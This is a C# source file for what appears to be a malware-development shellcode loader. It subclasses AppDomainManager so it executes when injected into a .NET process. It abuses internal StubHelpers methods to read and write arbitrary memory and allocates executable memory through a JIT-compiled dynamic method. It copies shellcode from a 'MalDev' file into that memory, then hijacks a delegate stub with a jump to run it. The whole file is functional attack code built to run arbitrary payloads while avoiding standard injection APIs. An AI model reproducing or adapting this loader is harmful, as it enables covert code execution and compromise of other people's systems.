using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows;
using System.Reflection.Emit;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.IO;
using System.Linq;
using System.Threading;
using System.Runtime.ConstrainedExecution;
using System.Security;

public sealed class UevApp : AppDomainManager
{

    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        bool res = UevAppClass.Execute();
        return;
    }
}

public class UevAppClass
{
    public static void WriteMemory(IntPtr addr, IntPtr value)
    {
        var mngdRefCustomeMarshaller = typeof(System.String).Assembly.GetType("System.StubHelpers.MngdRefCustomMarshaler");
        var CreateMarshaler = mngdRefCustomeMarshaller.GetMethod("CreateMarshaler", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);

        CreateMarshaler.Invoke(null, new object[] { addr, value });
    }

    public static IntPtr ReadMemory(IntPtr addr)
    {
        var stubHelper = typeof(System.String).Assembly.GetType("System.StubHelpers.StubHelpers");
        var GetNDirectTarget = stubHelper.GetMethod("GetNDirectTarget", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);

        IntPtr unmanagedPtr = Marshal.AllocHGlobal(200);
        for (int i = 0; i < 200; i += IntPtr.Size)
        {
            Marshal.Copy(new[] { addr }, 0, unmanagedPtr + i, 1);
        }

        return (IntPtr)GetNDirectTarget.Invoke(null, new object[] { unmanagedPtr });
    }

    public static void CopyMemory(byte[] source, IntPtr dest)
    {
        // Pad to IntPtr length
        if ((source.Length % IntPtr.Size) != 0)
        {
            source = source.Concat<byte>(new byte[source.Length % IntPtr.Size]).ToArray();
        }

        GCHandle pinnedArray = GCHandle.Alloc(source, GCHandleType.Pinned);
        IntPtr sourcePtr = pinnedArray.AddrOfPinnedObject();
        for (int i = 0; i < source.Length; i += IntPtr.Size)
        {
            WriteMemory(dest + i, ReadMemory(sourcePtr + i));
        }

        Array.Clear(source, 0, source.Length);
    }

    public static IntPtr GenerateRWXMemory(int ByteCount)
    {
        AssemblyName AssemblyName = new AssemblyName("Assembly");
        AssemblyBuilder AssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(AssemblyName, AssemblyBuilderAccess.Run);
        ModuleBuilder ModuleBuilder = AssemblyBuilder.DefineDynamicModule("Module", true);
        MethodBuilder MethodBuilder = ModuleBuilder.DefineGlobalMethod("MethodName", MethodAttributes.Public | MethodAttributes.Static, typeof(void), new Type[] { });

        ILGenerator il = MethodBuilder.GetILGenerator();
        while (ByteCount > 0)
        {
            int length = 4;
            StringBuilder str_build = new StringBuilder();
            Random random = new Random();

            char letter;
            for (int i = 0; i < length; i++)
            {
                double flt = random.NextDouble();
                int shift = Convert.ToInt32(Math.Floor(25 * flt));
                letter = Convert.ToChar(shift + 65);
                str_build.Append(letter);
            }

            il.EmitWriteLine(str_build.ToString());
            ByteCount -= 18;
        }

        il.Emit(OpCodes.Ret);
        ModuleBuilder.CreateGlobalFunctions();
        RuntimeMethodHandle mh = ModuleBuilder.GetMethods()[0].MethodHandle;
        RuntimeHelpers.PrepareMethod(mh);
        return mh.GetFunctionPointer();
    }

    public delegate void Callback();

    public static void Action() { }

    delegate void Callingdelegate();

    //[DllImport("Kernel32")]
    //public static extern uint GetCurrentThreadId();

    //[DllImport("Kernel32")]
    //public static extern int SuspendThread(IntPtr hThread);

    //public enum ThreadAccess : int
    //{
    //    TERMINATE = (0x0001),
    //    SUSPEND_RESUME = (0x0002),
    //    GET_CONTEXT = (0x0008),
    //    SET_CONTEXT = (0x0010),
    //    SET_INFORMATION = (0x0020),
    //    QUERY_INFORMATION = (0x0040),
    //    SET_THREAD_TOKEN = (0x0080),
    //    IMPERSONATE = (0x0100),
    //    DIRECT_IMPERSONATION = (0x0200)
    //}

    //[DllImport("kernel32.dll", SetLastError = true)]
    //static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    //[DllImport("kernel32.dll", SetLastError = true)]
    //[ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    //[SuppressUnmanagedCodeSecurity]
    //[return: MarshalAs(UnmanagedType.Bool)]
    //static extern bool CloseHandle(IntPtr hObject);

    //[DllImport("kernel32.dll")]
    //static extern uint GetLastError();

    public static bool Execute()
    {
        //uint currentThreadID = GetCurrentThreadId();
        //foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
        //{
        //    if (thread.Id != currentThreadID)
        //    {
        //        IntPtr hThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);
        //        if (hThread != IntPtr.Zero)
        //        {
        //            if (SuspendThread(hThread) == -1)
        //            {
        //                var lastError = GetLastError();
        //                System.Windows.Forms.MessageBox.Show(lastError.ToString("X8"));
        //            }
        //            CloseHandle(hThread);
        //        }
        //        else
        //        {
        //            var lastError = GetLastError();
        //            System.Windows.Forms.MessageBox.Show(lastError.ToString("X8"));
        //        }
        //    }
        //}

        byte[] shellcode = File.ReadAllBytes("D:\\Documents\\source\\repos\\MalDev\\x64\\Debug\\FinalTest.sc");
        //byte[] shellcode = File.ReadAllBytes("C:\\Users\\Admin\\Downloads\\download.dat");
        IntPtr pMem = GenerateRWXMemory(shellcode.Length);
        Callback myAction = new Callback(Action);
        IntPtr pMyAction = Marshal.GetFunctionPointerForDelegate(myAction);
        var jmpCode = new byte[] { 0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, 0xFF, 0xE0 };

        System.Windows.Forms.MessageBox.Show(pMem.ToString("X8"));
        CopyMemory(shellcode, pMem);

        // copy jmpcode stub in delegate function pointer
        CopyMemory(jmpCode, pMyAction);

        // overwrite x41 stub with IL.Emit allocated memory function pointer address
        WriteMemory(pMyAction + 2, pMem + 0x90C20);
        //WriteMemory(pMyAction + 2, pMem);
        Callingdelegate callingdelegate = Marshal.GetDelegateForFunctionPointer<Callingdelegate>(pMyAction);
        callingdelegate();
        while (true)
        {
            Thread.Sleep(1000000);
        }

        return true;
    }
}